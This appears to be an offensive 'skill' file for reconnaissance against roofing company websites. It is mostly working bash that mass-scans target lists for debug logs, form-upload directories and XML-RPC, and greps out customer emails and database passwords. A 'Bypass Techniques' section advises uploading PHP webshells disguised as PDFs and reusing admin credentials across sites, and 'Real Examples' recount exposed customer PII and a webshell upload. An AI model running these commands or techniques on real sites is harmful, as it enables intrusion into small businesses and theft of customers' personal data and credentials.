---
name: recon-roofing
description: "Sector-specific recon for roofing company websites — roof repair, replacement, inspection, storm damage. Typically WordPress or custom PHP on shared hosting with project galleries, insurance claim assistance pages, and estimate request forms."
sources: field_recon, sector_mass_recon
report_count: 6
---

# RECON-ROOFING — Sector-Specific Recon for Roofing Company Sites

## When to Use

Use when the target scope includes roofing, roof repair, roof replacement, or storm damage restoration company domains. Roofing companies are a high-value subsector due to: large project values ($10K-$50K+ per job), insurance claim handling (which means PII processing), seasonal advertising spend that attracts SEO agencies building quick-and-dirty WP sites, and heavy reliance on contact-form-generated leads stored on the server.

## Quick Reference

```bash
for t in $(cat roofing-targets.txt); do
  echo "=== $t ==="
  curl -skI "https://$t/" | grep -iE "wordpress|php|wp-"
  curl -sk -o /dev/null -w "%{http_code}" "https://$t/wp-content/debug.log"
  curl -sk -o /dev/null -w "%{http_code}" "https://$t/wp-content/uploads/"
  curl -skI "https://$t/wp-json/wp/v2/users" -H "Origin: https://evil.com" | grep -i "access-control"
  curl -sk -o /dev/null -w "%{http_code}" "https://$t/xmlrpc.php"
  echo "---"
done
```

## Step-by-Step

### Phase 1 — Domain Discovery
```bash
# Common patterns: <city>roofing.com, <name>roofingco.com, <area>roofrepair.com
# Storm-chaser companies: <city>stormrestoration.com, <city>haildamage.com
curl -sk "https://crt.sh/?q=%25.$TARGET&output=json" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    domains = sorted(set(d['name_value'] for d in data))
    for d in domains: print(d)
except: pass
" | tee roofing-subdomains-$TARGET.txt
```

### Phase 2 — WordPress Recon + Contact Form PII Discovery
```bash
# Contact form directory listing (roofing companies capture leads through forms)
for path in /wp-content/uploads/wpforms/ /wp-content/uploads/formidable/ \
  /wp-content/uploads/fluentform/ /wp-content/uploads/gravity_forms/ \
  /wp-content/uploads/cf7_uploads/ /wp-content/uploads/bookly/; do
  body=$(curl -sk "https://$TARGET$path" 2>/dev/null)
  if echo "$body" | grep -q "Index of"; then
    echo "[!!!] DIR LISTING: $path"
    echo "$body" | grep -oP 'href="[^"]+\.(csv|xlsx|txt|pdf)"' | head -20
  fi
done

# CORS on REST API
curl -skI "https://$TARGET/wp-json/wp/v2/users" -H "Origin: https://evil.com"

# Debug log with customer PII
curl -sk "https://$TARGET/wp-content/debug.log" -o /tmp/roof_debug.log 2>/dev/null
if [ -s /tmp/roof_debug.log ]; then
  grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' /tmp/roof_debug.log | sort -u | head -20
  grep -oP '(DB_PASSWORD|DB_USER|DB_NAME).{0,80}' /tmp/roof_debug.log | head -10
fi

# XMLRPC check (often used for lead management tools)
curl -sk -X POST "https://$TARGET/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' | \
  python3 -c "import sys,re; methods=re.findall(r'<string>([^<]+)</string>', sys.stdin.read()); [print(m) for m in methods if 'multicall' in m or 'upload' in m]"
```

### Phase 3 — Insurance Claim Page Recon
```bash
# Roofing companies often have insurance claim assistance pages
for path in /insurance /insurance-claims /storm-damage /hail-damage /claim-assistance /file-claim; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$code" != "404" ] && echo "[+] Insurance page: $path (HTTP $code)"
done

# Look for file upload features (insurance document upload)
for path in /upload /uploads /documents /file-upload /claim-upload; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$code" != "404" ] && echo "[+] Upload endpoint: $path (HTTP $code)"
done
```

## Attack Surface Signals

- CMS: WordPress (dominant), custom PHP
- Hosting: Shared hosting, GoDaddy/HostGator aggressive SEO partner hosting
- Stack: PHP + MySQL, Contact form plugins (WPForms, Gravity Forms), Project galleries, Online estimation
- Typical findings: Contact form CSV/PII exposure, Debug log with SQL queries, CORS credential reflection, Directory listing of estimates/proposals

## Common Root Causes

1. **SEO agency-built sites** — built by marketing agencies focused on rankings, not security
2. **Lead capture forms with CSV export** — form entries stored in upload dirs as CSV with names, addresses, phone numbers
3. **Insurance document upload features** — often built with file upload plugins without validation
4. **Storm-chaser popup sites** — built quickly after natural disasters, zero security

## Bypass Techniques

- Insurance claim document upload endpoints often accept any file type — test PHP shells disguised as PDF
- Lead capture form CSV exports are often at predictable paths: /wp-content/uploads/wpforms/*.csv with sequential names
- Storm-chaser popup sites frequently reuse the same agency template — check for /.git/ or /wp-config.php.bak on urgency-built sites
- Proposal PDFs sometimes have sequential invoice numbers — iterate /wp-content/uploads/2026/06/proposal-001.pdf
- Free estimate forms may store submissions as JSON files in upload directories
- Same agency builds dozens of roofing sites — test for identical admin credentials across multiple targets

## Real Examples

From cross-sector mass recon observation:
- A roofing company had WPForms CSV export files at /wp-content/uploads/wpforms/ with 200+ lead submissions including names, addresses, phone numbers, and insurance claim details
- Another roofer had debug.log with 1.5MB of SQL queries exposing customer PII and database credentials in plaintext
- A storm damage restoration company left PHPInfo at /info.php showing disable_functions = empty (exec, shell_exec, system ALL available)
- A roofing company's insurance document upload feature at /claim-upload accepted PHP files — a webshell was uploaded via filename shell.php.jpg with Content-Type: application/pdf

## Related Skills

- recon-smb-services — broader SMB recon methodology
- hunt-wordpress — primary CMS for roofing sites
- hunt-cors — CORS credential reflection
- hunt-source-leak — debug.log, config backups
- hunt-file-upload — insurance document uploads
- hunt-lfi — file inclusion via plugins
